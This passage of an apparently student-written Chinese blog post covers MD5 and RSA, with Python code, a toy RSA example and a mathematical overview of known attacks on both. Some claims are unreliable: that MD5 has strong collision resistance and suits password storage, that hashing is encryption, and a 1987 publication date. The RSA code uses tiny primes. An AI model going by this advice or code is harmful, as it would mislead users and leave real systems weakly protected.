class="number">10</span>],<span class="number">17</span>,get_t(<span class="number">11</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">11</span>],<span class="number">22</span>,get_t(<span class="number">12</span>))</span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">12</span>],<span class="number">7</span>,get_t(<span class="number">13</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">13</span>],<span class="number">12</span>,get_t(<span class="number">14</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">14</span>],<span class="number">17</span>,get_t(<span class="number">15</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">15</span>],<span class="number">22</span>,get_t(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二轮循环</span></span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">1</span>],<span class="number">5</span>,get_t(<span class="number">17</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">6</span>],<span class="number">9</span>,get_t(<span class="number">18</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">11</span>],<span class="number">14</span>,get_t(<span class="number">19</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">0</span>],<span class="number">20</span>,get_t(<span class="number">20</span>))</span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">5</span>],<span class="number">5</span>,get_t(<span class="number">21</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">10</span>],<span class="number">9</span>,get_t(<span class="number">22</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">15</span>],<span class="number">14</span>,get_t(<span class="number">23</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">4</span>],<span class="number">20</span>,get_t(<span class="number">24</span>))</span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">9</span>],<span class="number">5</span>,get_t(<span class="number">25</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">14</span>],<span class="number">9</span>,get_t(<span class="number">26</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">3</span>],<span class="number">14</span>,get_t(<span class="number">27</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">8</span>],<span class="number">20</span>,get_t(<span class="number">28</span>))</span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">13</span>],<span class="number">5</span>,get_t(<span class="number">29</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">2</span>],<span class="number">9</span>,get_t(<span class="number">30</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">7</span>],<span class="number">14</span>,get_t(<span class="number">31</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">12</span>],<span class="number">20</span>,get_t(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三轮循环</span></span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">5</span>],<span class="number">4</span>,get_t(<span class="number">33</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">8</span>],<span class="number">11</span>,get_t(<span class="number">34</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">11</span>],<span class="number">16</span>,get_t(<span class="number">35</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">14</span>],<span class="number">23</span>,get_t(<span class="number">36</span>))</span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">1</span>],<span class="number">4</span>,get_t(<span class="number">37</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">4</span>],<span class="number">11</span>,get_t(<span class="number">38</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">7</span>],<span class="number">16</span>,get_t(<span class="number">39</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">10</span>],<span class="number">23</span>,get_t(<span class="number">40</span>))</span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">13</span>],<span class="number">4</span>,get_t(<span class="number">41</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">0</span>],<span class="number">11</span>,get_t(<span class="number">42</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">3</span>],<span class="number">16</span>,get_t(<span class="number">43</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">6</span>],<span class="number">23</span>,get_t(<span class="number">44</span>))</span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">9</span>],<span class="number">4</span>,get_t(<span class="number">45</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">12</span>],<span class="number">11</span>,get_t(<span class="number">46</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">15</span>],<span class="number">16</span>,get_t(<span class="number">47</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">2</span>],<span class="number">23</span>,get_t(<span class="number">48</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四轮循环</span></span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">0</span>],<span class="number">6</span>,get_t(<span class="number">49</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">7</span>],<span class="number">10</span>,get_t(<span class="number">50</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">14</span>],<span class="number">15</span>,get_t(<span class="number">51</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">5</span>],<span class="number">21</span>,get_t(<span class="number">52</span>))</span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">12</span>],<span class="number">6</span>,get_t(<span class="number">53</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">3</span>],<span class="number">10</span>,get_t(<span class="number">54</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">10</span>],<span class="number">15</span>,get_t(<span class="number">55</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">1</span>],<span class="number">21</span>,get_t(<span class="number">56</span>))</span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">8</span>],<span class="number">6</span>,get_t(<span class="number">57</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">15</span>],<span class="number">10</span>,get_t(<span class="number">58</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">6</span>],<span class="number">15</span>,get_t(<span class="number">59</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">13</span>],<span class="number">21</span>,get_t(<span class="number">60</span>))</span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">4</span>],<span class="number">6</span>,get_t(<span class="number">61</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">11</span>],<span class="number">10</span>,get_t(<span class="number">62</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">2</span>],<span class="number">15</span>,get_t(<span class="number">63</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">9</span>],<span class="number">21</span>,get_t(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">A = (AA + A) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">B = (BB + B) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">C = (CC + C) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">D = (DD + D) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">AA = A</span><br><span class="line">BB = B</span><br><span class="line">CC = C</span><br><span class="line">DD = D</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(word)</span>:</span></span><br><span class="line"><span class="keyword">global</span> A,B,C,D</span><br><span class="line"><span class="comment"># 初始化链接向量</span></span><br><span class="line">A = <span class="number">0x67452301</span></span><br><span class="line">B = <span class="number">0xEFCDAB89</span></span><br><span class="line">C = <span class="number">0x98BADCFE</span></span><br><span class="line">D = <span class="number">0x10325476</span></span><br><span class="line">bintext = additonal_filling(word)</span><br><span class="line">bdata = bintext</span><br><span class="line">group_mess = [[]*<span class="number">16</span>] <span class="comment"># 分组消息数组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">group_mess[<span class="number">0</span>].append(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bdata)//<span class="number">512</span>):</span><br><span class="line">temp = bdata[i*<span class="number">512</span>:i*<span class="number">512</span>+<span class="number">512</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">group_mess[<span class="number">0</span>][j] = temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>]</span><br><span class="line">step_function(group_mess)</span><br><span class="line">A = hex(A)[<span class="number">2</span>:]</span><br><span class="line">B = hex(B)[<span class="number">2</span>:]</span><br><span class="line">C = hex(C)[<span class="number">2</span>:]</span><br><span class="line">D = hex(D)[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 按小端字节序级联输出</span></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> (A,B,C,D):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>//<span class="number">2</span>):</span><br><span class="line">out += item[(<span class="number">3</span>-i)*<span class="number">2</span>:(<span class="number">3</span>-i)*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">word1 = <span class="string">"iscbupt"</span></span><br><span class="line">word2 = <span class="string">"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications"</span></span><br><span class="line">word3 = <span class="string">"State Key Laboratory of Networking and Switching"</span></span><br><span class="line">word4 = <span class="string">"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!"</span></span><br><span class="line">print(word1)</span><br><span class="line">    print(encrypt(word1))</span><br><span class="line">    print(word2)</span><br><span class="line">print(encrypt(word2))</span><br></pre></td></tr></table></div></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/2.png" alt="demo"></p><p><strong>安全性分析</strong></p><p>​    MD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。</p><p>​    在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，<strong>在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。</strong>所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 </p><ul><li><p>哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 <span class="exturl"><a class="exturl__link" href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目</p><p>存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 </p></li><li><p>特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 <span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/A2008A/archive/2012/08/10/2631840.html" target="_blank" rel="noopener">link</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，专家还给出了MD5碰撞快读生成器。</p></li></ul><p>面对这两个攻击，一个提高MD5安全性的有效手段是 <strong>加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）</strong>。</p><p><strong>实用性分析：</strong></p><p>​    即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。</p>        <h1 id="公钥密码">          <a href="#公钥密码" class="heading-link"><i class="fas fa-link"></i></a>公钥密码</h1>              <h2 id="RSA公钥加密体制">          <a href="#RSA公钥加密体制" class="heading-link"><i class="fas fa-link"></i></a>RSA公钥加密体制</h2>      <p>​    RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种<em>非对称加密算法</em>。RSA是目前最重要的网络加密算法。</p><p>算法原理：</p><blockquote><p>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难</p></blockquote><p>​    第一步</p><blockquote><p>选定两个质数p、q，实际应用中这两个数越大安全性越高。</p></blockquote><p>​    第二步</p><blockquote><p>计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是<em>密钥长度</em>，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。</p></blockquote><p>​    第三步</p><blockquote><p>计算n的 <em>欧拉函数</em> φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表</p></blockquote><p>​    第四步</p><blockquote><p> 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击<span class="exturl"><a class="exturl__link" href="https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8" target="_blank" rel="noopener">这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>​    第五步</p><blockquote><p>寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用<em>扩展欧几里得算法</em> 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。</p></blockquote><p>​    第六步</p><blockquote><p>封装<em>（n，e1）</em>为<em>公钥</em> ，<em>（n，e2）</em>为<em>私钥</em>。</p></blockquote><p>​    至此，所有准备工作完成。</p><p>​    加密和解密</p><blockquote><p> 先介绍一下加解密的公式，假定明文为A，那么，<br> 密文B≡A^e1 mod n，要传输给对方的就是B<br> 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。</p></blockquote><p>​    假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(<em>^▽^</em>)。</p><blockquote><p> 假定要传输的明文为： 32<br>  注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。</p></blockquote><p>​    加密</p><blockquote><p>A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密</p></blockquote><p>​    解密</p><blockquote><p>A = B^e2 mod n = 32 ，成功得到明文32！</p></blockquote><p>简单证明一下上述算法的正确性：</p><p> <em>欧拉定理</em> </p><blockquote><p>若n,a为正整数，且n,a互质，则<br>$a^{φ(n)} ≡ 1 （mod \; n）$ </p></blockquote><p>​    φ（n）为 <em>欧拉函数</em> ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质</p><blockquote><p>如果n可以分解为两个互质的整数p、q的乘积，那么有<br>φ（n）= (p-1) * (q-1)</p></blockquote><p>​    接下来要证明的就是为什么下面两个式子可以互换实现</p><blockquote><p>B=A^e1   mod n<br>A=B^e2   mod n</p></blockquote><p>​    解密规则为</p><blockquote><p>A=B^e2 mod n</p></blockquote><p>​    根据加密规则</p><blockquote><p>B = A^e1 mod n<br>B = A^e1 - kn</p></blockquote><p>​    代入解密式中</p><blockquote><p>(A^e1 - kn)^e2 ≡ A （mod n）</p></blockquote><p>​    等于证</p><blockquote><p>$A^{e1*e2} ≡ m （mod \; n）$</p></blockquote><p>​<br>由 <em>欧拉定理</em> 可以得到</p><blockquote><p>e1&#42;e2 ≡ 1  [ mod φ（n）]<br>e1&#42;e2 ≡ hφ（n）+1</p></blockquote><p>​    代入前面的式子可以得到</p><blockquote><p>$A^{hφ（n）+1} \; ≡ m (mod\;n)$</p></blockquote><p>​    上式恒成立，则算法正确性得证。</p><p><strong>代码如下：</strong></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转为2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(s)</span>:</span></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">text += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(s)</span>:</span></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">text += chr(int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastExpMod</span><span class="params">(b, e, m)</span>:</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (e&amp;<span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># ei = 1, then mul</span></span><br><span class="line">            result = (result * b) % m</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b = (b*b) % m</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数,输入为plain字符明文，n，e</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line"><span class="keyword">global</span> n</span><br><span class="line"><span class="keyword">global</span> e</span><br><span class="line"><span class="comment"># 将明文转为比特串</span></span><br><span class="line">bitplian = str2bin(plain)</span><br><span class="line">group_len = int(math.log(n,<span class="number">2</span>)) - <span class="number">1</span> </span><br><span class="line">arr_group = []</span><br><span class="line"><span class="keyword">if</span> (len(bitplian) % group_len) != <span class="number">0</span>:</span><br><span class="line">bitplian += <span class="string">"0"</span>*(group_len-(len(bitplian) % group_len))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bitplian) // group_len):</span><br><span class="line">arr_group.append(bitplian[i*group_len:i*group_len+group_len])</span><br><span class="line">cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> arr_group:</span><br><span class="line">ci = fastExpMod(int(item,<span class="number">2</span>),e,n)</span><br><span class="line">cipher += <span class="string">f'<span class="subst">&#123;bin(ci)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;group_len+<span class="number">2</span>&#125;</span>&#125;'</span></span><br><span class="line"><span class="keyword">return</span> hex(int(cipher,<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数，输入为cipehr16进制密文，n，d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line"><span class="keyword">global</span> n</span><br><span class="line"><span class="keyword">global</span> d</span><br><span class="line">bitcipher = bin(int(cipher,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">temp_len = int(math.log(n,<span class="number">2</span>)) + <span class="number">1</span> </span><br><span class="line"><span class="keyword">if</span> (len(bitcipher) % temp_len) != <span class="number">0</span>:</span><br><span class="line">bitcipher = <span class="string">"0"</span>*(temp_len - (len(bitcipher) % temp_len)) + bitcipher</span><br><span class="line">group_len = int(math.log(n,<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line">arr_group = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bitcipher) // group_len):</span><br><span class="line">arr_group.append(bitcipher[i*group_len:i*group_len+group_len])</span><br><span class="line">bitplain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> arr_group:</span><br><span class="line"><span class="comment"># mi = (int(item,2)**d % n)</span></span><br><span class="line">mi = fastExpMod(int(item,<span class="number">2</span>),d,n)</span><br><span class="line">bitplain += <span class="string">f'<span class="subst">&#123;bin(mi)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;group_len<span class="number">-2</span>&#125;</span>&#125;'</span></span><br><span class="line"><span class="keyword">return</span> bin2str(bitplain)</span><br><span class="line"></span><br><span class="line">p = <span class="number">2147483647</span></span><br><span class="line">q = <span class="number">1000000007</span></span><br><span class="line">n = p * q</span><br><span class="line">pi_n = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gp.invert(e,pi_n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">'e'</span>:</span><br><span class="line">plain = input(<span class="string">"Plz input message: "</span>)</span><br><span class="line">cipher = rsa_encrypt(plain)</span><br><span class="line">print(<span class="string">"cipher: "</span>, cipher)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">'d'</span>:</span><br><span class="line">cipher = input(<span class="string">"Plz input cipher: "</span>)</span><br><span class="line">plain = rsa_decrypt(cipher)</span><br><span class="line">print(<span class="string">"plain: "</span>,plain)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/2.png" alt="demo"></p><p><strong>安全性分析</strong></p><p>​    到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，<strong>但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题</strong>，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法</p><ul><li><p>直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解</p></li><li><p>低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 </p><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p><p>即：</p></li></ul><blockquote><script type="math/tex; mode=display">cequiv m^e mod n</script></blockquote><p>  如果e=3，且$ m^e&lt;{n} $，那么：</p><blockquote><p>​                        $ c= m^e,$ $e=3$</p><p> ​                        $ m=sqrt[3]{c}$</p></blockquote><p>  如果明文的三次方比n大，但是不是足够大，那么设k，有：</p><p>  ​                        $ c= m^e+kn$</p><p>  爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p><ul><li><p>低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 </p><p>即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：</p><p>​                        $ c_1equiv m^e$ $mod$ $n_1$</p><p>​                        $ c_2equiv m^e$ $mod$ $n_2$</p><p>​                        $ c_3equiv m^e$ $mod$ $n_3$</p><p>对上述等式运用中国剩余定理，在e=3时，可以得到：</p><p>​                        $ c_xequiv m^3$ $mod$ $n_1n_2n_3$</p><p>通过对$ c_x $进行三次开方可以求得明文。</p></li><li><p>公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p><p>即：</p><p>​                        $ c_1equiv m^{e_1}$ $mod$ $n$</p><p>​                        $ c_2equiv m^{e_2}$ $mod$ $n$</p><p>此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。</p></li></ul><hr><p>​    由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。</p><hr><p>通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xn_mod_p2</span><span class="params">(x, n, p)</span>:</span></span><br><span class="line">  res = <span class="number">1</span></span><br><span class="line">  <span class="comment"># n_bin = bin(n)[2:]</span></span><br><span class="line">  n_bin = bin(int(n))[<span class="number">2</span>:]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(n_bin)):</span><br><span class="line">    res = res**<span class="number">2</span> % p</span><br><span class="line">    <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">      res = res * x % p</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span 